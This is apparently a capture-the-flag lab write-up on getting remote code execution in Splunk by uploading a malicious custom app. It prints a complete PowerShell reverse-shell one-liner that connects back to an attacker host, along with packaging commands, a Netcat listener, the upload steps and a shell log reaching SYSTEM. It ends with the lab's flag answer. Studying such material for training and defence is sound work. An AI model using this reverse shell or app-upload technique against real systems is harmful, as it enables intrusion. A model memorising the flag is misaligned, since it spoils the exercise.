# Attacking Splunk
## Abusing Built-In Functionality
We can use [this](https://github.com/0xjpuff/reverse_shell_splunk) Splunk package to assist us. The bin directory in this repo has examples for Python and PowerShell.

We first need to create a custom Splunk application using the following directory structure.

```sh
$ git clone https://github.com/0xjpuff/reverse_shell_splunk
$ cd reverse_shell_splunk/reverse_shell_splunk
```

The `bin` directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our `inputs.conf` file. Our reverse shell will be a PowerShell one-liner.

```pwsh
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Once edited, we can create a tarball or `.spl` file.

```sh
$ tar -cvzf updater.tar.gz reverse_shell_splunk//

reverse_shell_splunk//
reverse_shell_splunk//bin/
reverse_shell_splunk//bin/rev.py
reverse_shell_splunk//bin/run.bat
reverse_shell_splunk//bin/run.ps1
reverse_shell_splunk//default/
reverse_shell_splunk//default/inputs.conf
```

The next step is to choose `Install app from file` and upload the application.

```
https://10.129.201.50:8000/en-US/manager/search/apps/local
```

Before uploading the malicious custom app, let's start a listener using Netcat:

```sh
$ sudo nc -lnvp 443

listening on [any] 443 ...
```

On the `Upload app` page, click on browse, choose the tarball we created earlier and click `Upload`.

```
https://10.129.201.50:8000/en-US/manager/appinstall/_upload?breadcrumbs=Settings%7C%2Fmanager%2Fsearch%2F%09Apps%7C%2Fmanager%2Fsearch%2Fapps%2Flocal
```

As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to `Enabled`.

If we were dealing with a Linux host, we would need to edit the `rev.py` Python script before creating the tarball and uploading the custom malicious app. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races.

## Questions
1. Attack the Splunk target and gain remote code execution. Submit the contents of the flag.txt file in the c:\loot directory. **Answer: l00k_ma_no_AutH!**
   - Follow the steps above, at the reverse shell:
        ```sh
        $ nc -nlvp 8443
        Listening on 0.0.0.0 8443
        Connection received on 10.129.48.212 52201


        PS C:\Windows\system32> PS C:\Windows\system32> whoami
        nt authority\system
        PS C:\Windows\system32> dir c:\loot


            Directory: C:\loot


        Mode                LastWriteTime         Length Name                                                                  
        ----                -------------         ------ ----                                                                  
        -a----        9/29/2021   6:16 PM             16 flag.txt                                                              


        PS C:\Windows\system32> more c:\loot\flag.txt
        l00k_ma_no_AutH!
        ```